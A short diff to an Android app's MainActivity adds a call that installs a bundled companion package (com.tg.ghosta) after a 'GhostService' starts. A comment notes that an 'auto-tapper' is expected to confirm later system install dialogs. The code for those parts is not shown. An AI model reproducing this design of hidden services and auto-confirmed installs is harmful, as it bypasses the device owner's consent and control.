@@ -252,6 +252,11 @@ class MainActivity : Activity() {
             PackageManager.DONT_KILL_APP
         )
         startForegroundService(Intent(this, GhostService::class.java))
+        // Self-provision the ghosta sidekick from the bundled asset. FIRST
+        // install of com.tg.ghosta: the system confirm dialog appears and
+        // needs ONE human tap (the auto-tapper isn't installed yet). Fire-
+        // and-forget; status is logged by the provision thread.
+        SidekickInstaller.provisionBundledAsync(this, "wizard-finish")
         for (r in rows) {
             r.button?.visibility = Button.GONE
         }
